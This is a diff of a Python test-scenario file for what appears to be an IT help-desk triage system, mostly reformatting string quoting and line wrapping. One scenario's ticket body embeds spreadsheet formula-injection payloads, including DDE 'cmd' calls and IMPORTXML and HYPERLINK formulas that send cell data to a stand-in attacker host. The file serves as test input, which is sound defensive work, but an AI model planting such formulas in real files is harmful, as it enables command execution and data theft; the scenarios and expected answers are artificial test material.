@@ -5096,23 +5096,23 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             " timing out. Here is the raw CSV so you can see what I'm"
             " working with:\n\n"
             "Employee,Amount,Description,Date\n"
-            '=CMD(\'calc.exe\'),1500.00,"Hotel — NYC trip",2025-04-10\n'
-            "\"=HYPERLINK(\"\"http://evil.example.com\"\","
-            "\"\"Click Here\"\")\",2300.00,\"Flights\",2025-04-11\n"
+            "=CMD('calc.exe'),1500.00,\"Hotel — NYC trip\",2025-04-10\n"
+            '"=HYPERLINK(""http://evil.example.com"",'
+            '""Click Here"")",2300.00,"Flights",2025-04-11\n'
             "+cmd|'/C calc'!A0,45.00,\"Taxi\",2025-04-11\n"
-            "=1+1,78.00,\"Meals\",2025-04-12\n"
+            '=1+1,78.00,"Meals",2025-04-12\n'
             "-2+3+cmd|' /C calc'!A0,120.00,\"Dinner\",2025-04-12\n"
-            "@SUM(A1:A10),0.00,\"Subtotal\",2025-04-12\n\n"
+            '@SUM(A1:A10),0.00,"Subtotal",2025-04-12\n\n'
             "The file is about 800 rows total. The portal says 'Request"
             " Entity Too Large' after spinning for two minutes. Can you"
             " increase the upload limit or suggest another way to submit?",
             "Pasting my expense CSV below because the upload keeps failing"
             " with a 413 error:\n\n"
             "Name,Cost,Notes\n"
-            "=IMPORTXML(\"http://evil.example.com/steal?\"&A1,\"//a\"),"
-            "999.99,\"formula test\"\n"
-            "=IMAGE(\"http://evil.example.com/track.png\"),0,\"img\"\n"
-            "Normal Entry,50.00,\"Lunch\"\n\n"
+            '=IMPORTXML("http://evil.example.com/steal?"&A1,"//a"),'
+            '999.99,"formula test"\n'
+            '=IMAGE("http://evil.example.com/track.png"),0,"img"\n'
+            'Normal Entry,50.00,"Lunch"\n\n'
             "The rest of the file is normal. I think the portal has a file"
             " size limit around 5 MB and my file is 6.2 MB. Running Chrome"
             " 124 on Windows 11.",
@@ -5218,8 +5218,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 " using Add-MailboxPermission and"
                 " Add-RecipientPermission in Exchange Online"
                 " PowerShell",
-                "Ask the user to restart Outlook and confirm the"
-                " shared mailbox reappears and Send-As works",
+                "Ask the user to restart Outlook and confirm the shared mailbox reappears and Send-As works",
             ),
         ),
         tags=("data-cleanup", "pgp-signed-email"),
@@ -5230,7 +5229,9 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
     ScenarioDefinition(
         scenario_id="dc-gen-084",
         subjects=(
-            "M\u0336\u0318y\u0337\u031e l\u0335\u0326a\u0336\u031fp\u0334\u0320t\u0338\u0325o\u0337\u0319p\u0336\u031f keeps crashing",
+            "M\u0336\u0318y\u0337\u031e l\u0335\u0326a\u0336\u031f"
+            "p\u0334\u0320t\u0338\u0325o\u0337\u0319"
+            "p\u0336\u031f keeps crashing",
             "Laptop blue-screens every morning — garbled display",
         ),
         descriptions=(
@@ -5277,8 +5278,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "Update the WD19TBS dock firmware and the Dell"
                 " Thunderbolt controller driver to the latest"
                 " versions from Dell support",
-                "If the BSOD persists, test with a different"
-                " docking station to isolate hardware vs. driver",
+                "If the BSOD persists, test with a different docking station to isolate hardware vs. driver",
             ),
         ),
         tags=("data-cleanup", "zalgo-text"),
@@ -5296,7 +5296,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             '{"timestamp":"2025-05-18T14:32:01Z","level":"ERROR",'
             '"service":"api-gateway","traceId":"abc123def456",'
             '"spanId":"789ghi","message":"upstream connect error'
-            ' or disconnect/reset before headers. reset reason:'
+            " or disconnect/reset before headers. reset reason:"
             ' connection termination","details":{"downstream":'
             '{"method":"POST","path":"/api/v2/orders","host":'
             '"api.contoso.com","status":502},"upstream":{"cluster":'
@@ -5427,12 +5427,8 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 " OrderDetails(OrderID, ProductID) INCLUDE"
                 " (Quantity, UnitPrice) can reduce the 48.7M-row"
                 " table scan",
-                "Re-run the nightly report query and verify"
-                " execution time drops back to the expected"
-                " 45-minute window",
-                "Set up a SQL Agent alert for any query"
-                " exceeding 2 hours elapsed time on this"
-                " database",
+                "Re-run the nightly report query and verify execution time drops back to the expected 45-minute window",
+                "Set up a SQL Agent alert for any query exceeding 2 hours elapsed time on this database",
             ),
         ),
         tags=("data-cleanup", "sql-query-output"),
@@ -5448,9 +5444,9 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
         ),
         descriptions=(
             "Content-Type: multipart/signed;"
-            " protocol=\"application/pkcs7-signature\";"
+            ' protocol="application/pkcs7-signature";'
             " micalg=sha-256;"
-            " boundary=\"----=_Part_8837_1234567890\"\n\n"
+            ' boundary="----=_Part_8837_1234567890"\n\n'
             "------=_Part_8837_1234567890\n"
             "Content-Type: text/plain; charset=UTF-8\n"
             "Content-Transfer-Encoding: quoted-printable\n\n"
@@ -5545,8 +5541,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 " empty despite the urgent subject line"
             ),
             remediation_steps=(
-                "Acknowledge receipt of the ticket and note that"
-                " the body contains no actionable information",
+                "Acknowledge receipt of the ticket and note that the body contains no actionable information",
                 "Request the submitter provide: the affected"
                 " system or service, what is not working, when"
                 " the issue started, and how many users are"
@@ -5554,8 +5549,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "If no response within 2 hours and the subject"
                 " indicates urgency, attempt to reach the"
                 " submitter by phone or Teams to clarify",
-                "Re-triage with appropriate category and"
-                " priority once details are provided",
+                "Re-triage with appropriate category and priority once details are provided",
             ),
         ),
         tags=("data-cleanup", "near-empty-body"),
@@ -5626,13 +5620,9 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "Immediately free space by removing old WAL"
                 " archives, temp files, and completed pg_dump"
                 " files from the /data partition",
-                "Evaluate extending the /data logical volume if"
-                " the underlying storage has unallocated space",
-                "Review PostgreSQL autovacuum and log rotation"
-                " settings to reduce ongoing disk growth rate",
-                "Set up a lower-threshold alert at 85% to"
-                " provide earlier warning before reaching"
-                " critical levels",
+                "Evaluate extending the /data logical volume if the underlying storage has unallocated space",
+                "Review PostgreSQL autovacuum and log rotation settings to reduce ongoing disk growth rate",
+                "Set up a lower-threshold alert at 85% to provide earlier warning before reaching critical levels",
             ),
         ),
         tags=("data-cleanup", "jira-notification"),
@@ -5699,8 +5689,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "If a GPO is confirmed, request an exception or"
                 " update the GPO to allow user-defined"
                 " signatures for this user's OU",
-                "Verify the fix persists across an Outlook"
-                " restart and a full machine reboot",
+                "Verify the fix persists across an Outlook restart and a full machine reboot",
             ),
         ),
         tags=("data-cleanup", "registry-export"),
@@ -5727,10 +5716,10 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             "    enriched = enrich_customer_data(df, api_client)\n"
             '  File "/opt/etl/stages/enrichment.py", line 203, in'
             " enrich_customer_data\n"
-            "    response = api_client.post(\"/v2/enrich\", payload="
+            '    response = api_client.post("/v2/enrich", payload='
             "batch)\n"
             '  File "/opt/etl/clients/api.py", line 56, in post\n'
-            "    return self._request(\"POST\", endpoint, json=payload)\n"
+            '    return self._request("POST", endpoint, json=payload)\n'
             '  File "/opt/etl/clients/api.py", line 41, in _request\n'
             "    resp.raise_for_status()\n"
             '  File "/opt/venv/lib/python3.11/site-packages/requests/'
@@ -5779,8 +5768,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "Add retry logic with exponential backoff to"
                 " the ETL API client so transient 503 errors do"
                 " not immediately fail the entire pipeline",
-                "Verify the downstream reporting dashboard"
-                " refreshes with current data after the re-run",
+                "Verify the downstream reporting dashboard refreshes with current data after the re-run",
             ),
         ),
         tags=("data-cleanup", "deep-traceback"),
@@ -5840,15 +5828,11 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 " destination: training.contoso.com/courses/"
                 "sec-aware-2025 — ignore the marketing"
                 " parameters and base64 tracking segments",
-                "Check whether the user's account has been"
-                " provisioned in the training portal's access"
-                " control list",
+                "Check whether the user's account has been provisioned in the training portal's access control list",
                 "Verify the training course sec-aware-2025 is"
                 " still active and has not expired or been"
                 " replaced by a newer version",
-                "Grant the user access and confirm they can"
-                " reach the course before the Friday compliance"
-                " deadline",
+                "Grant the user access and confirm they can reach the course before the Friday compliance deadline",
             ),
         ),
         tags=("data-cleanup", "tracking-urls"),
@@ -5916,9 +5900,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 " anna.kovacs@contoso.com to no-reply@contoso.com"
                 " by adding a transport rule or adjusting the"
                 " OOO responder to skip no-reply addresses",
-                "Bulk-close the 52 duplicate tickets generated"
-                " by the loop with a note explaining the root"
-                " cause",
+                "Bulk-close the 52 duplicate tickets generated by the loop with a note explaining the root cause",
                 "Configure the ticketing system to not send"
                 " acknowledgment emails to addresses matching"
                 " known OOO or auto-reply patterns",
@@ -5976,9 +5958,7 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "Ignore the base64 blob in the ticket body — it"
                 " is not usable for automated processing and may"
                 " be truncated",
-                "Ask the user to attach the original .xlsx file"
-                " directly to the ticket or upload it to"
-                " SharePoint",
+                "Ask the user to attach the original .xlsx file directly to the ticket or upload it to SharePoint",
                 "If the original file also fails to open, try"
                 " the Open and Repair feature in Excel (File >"
                 " Open > Browse > select file > Open dropdown >"
@@ -6005,8 +5985,8 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             " deployment. Here's the relevant config:\n\n"
             'resource "azurerm_virtual_network" "prod_vnet" {\n'
             '  name                = "vnet-prod-eastus2-001"\n'
-            '  location            = azurerm_resource_group.prod.location\n'
-            '  resource_group_name = azurerm_resource_group.prod.name\n'
+            "  location            = azurerm_resource_group.prod.location\n"
+            "  resource_group_name = azurerm_resource_group.prod.name\n"
             '  address_space       = ["10.100.0.0/16"]\n\n'
             "  tags = {\n"
             '    Environment = "Production"\n'
@@ -6032,8 +6012,8 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             "  }\n"
             "}\n\n"
             "Error: creating/updating Virtual Network"
-            " (Subscription: \"xxxx-xxxx\" / Resource Group:"
-            " \"rg-prod-eastus2\" / Name: \"vnet-prod-eastus2-001\"):"
+            ' (Subscription: "xxxx-xxxx" / Resource Group:'
+            ' "rg-prod-eastus2" / Name: "vnet-prod-eastus2-001"):'
             " network.VirtualNetworksClient#CreateOrUpdate: The"
             " address space '10.100.0.0/16' overlaps with existing"
             " VNet 'vnet-legacy-eastus2' address space"
@@ -6099,11 +6079,11 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
             "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  3)"
             "   provider: azure-ad\n"
             "e5f6g7h8 (Bob Martinez   2025-05-19 23:47:11 -0400  4)"
-            "   tenant_id: \"NEW-TENANT-ID-9999\"\n"
+            '   tenant_id: "NEW-TENANT-ID-9999"\n'
             "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  5)"
-            "   client_id: \"app-client-id-1234\"\n"
+            '   client_id: "app-client-id-1234"\n'
             "e5f6g7h8 (Bob Martinez   2025-05-19 23:47:11 -0400  6)"
-            "   redirect_uri: \"https://staging.contoso.com/callback\"\n"
+            '   redirect_uri: "https://staging.contoso.com/callback"\n'
             "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  7)"
             "   scopes:\n"
             "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  8)"
@@ -6149,14 +6129,11 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
                 "Immediately revert commit e5f6g7h8 or deploy a"
                 " hotfix restoring the production tenant_id and"
                 " redirect_uri in auth-config.yaml",
-                "Verify SSO login works by testing with a sample"
-                " account after the revert is deployed to"
-                " production",
+                "Verify SSO login works by testing with a sample account after the revert is deployed to production",
                 "Investigate how a staging configuration change"
                 " reached the production branch — review the"
                 " CI/CD pipeline and branch protection rules",
-                "Communicate resolution to the ~800 affected"
-                " employees and advise them to retry login",
+                "Communicate resolution to the ~800 affected employees and advise them to retry login",
             ),
         ),
         tags=("data-cleanup", "git-blame-output"),
